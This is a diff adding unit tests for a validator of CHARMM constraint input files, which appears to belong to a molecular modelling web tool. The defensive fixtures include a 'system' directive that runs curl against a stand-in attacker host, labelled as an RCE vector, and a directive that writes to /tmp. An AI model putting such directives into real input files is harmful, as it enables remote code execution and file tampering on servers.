@@ -59,6 +59,63 @@ describe('ValidationFunctions', () => {
     expect(result).toBe(true)
   })
 
+  it('isValidConstInpFile rejects system directive (CHARMM RCE vector)', async () => {
+    const content = [
+      'define fixed sele segid PROA end',
+      'cons fix sele fixed end',
+      'system "curl http://attacker.com"',
+      'return'
+    ].join('\n')
+    const result = await isValidConstInpFile(makeFile('evil.inp', content), 'pdb')
+    expect(typeof result).toBe('string')
+    expect(result as string).toContain('system')
+  })
+
+  it('isValidConstInpFile rejects open directive', async () => {
+    const content = [
+      'define fixed sele segid PROA end',
+      'cons fix sele fixed end',
+      'open unit 10 write card name /tmp/evil',
+      'return'
+    ].join('\n')
+    const result = await isValidConstInpFile(makeFile('evil.inp', content), 'pdb')
+    expect(typeof result).toBe('string')
+    expect(result as string).toContain('open')
+  })
+
+  it('isValidConstInpFile accepts ! comment lines', async () => {
+    const content = [
+      '! this is a comment',
+      'define fixed sele segid PROA end',
+      'cons fix sele fixed end',
+      'return'
+    ].join('\n')
+    const result = await isValidConstInpFile(makeFile('ok.inp', content), 'pdb')
+    expect(result).toBe(true)
+  })
+
+  it('isValidConstInpFile accepts * comment lines', async () => {
+    const content = [
+      '* another comment style',
+      'define fixed sele segid PROA end',
+      'cons fix sele fixed end',
+      'return'
+    ].join('\n')
+    const result = await isValidConstInpFile(makeFile('ok.inp', content), 'pdb')
+    expect(result).toBe(true)
+  })
+
+  it('isValidConstInpFile accepts cons harm lines', async () => {
+    const content = [
+      'define fixed sele segid PROA end',
+      'cons harm force 5.0 sele fixed end',
+      'cons fix sele fixed end',
+      'return'
+    ].join('\n')
+    const result = await isValidConstInpFile(makeFile('ok.inp', content), 'pdb')
+    expect(result).toBe(true)
+  })
+
   it('hasAllowedResiduesOnly returns valid for standard residues', async () => {
     const content = `ATOM      1  N   MET A   1\nATOM      2  CA  MET A   1\nEND\n`
     const result = await hasAllowedResiduesOnly(makeFile('model.pdb', content))
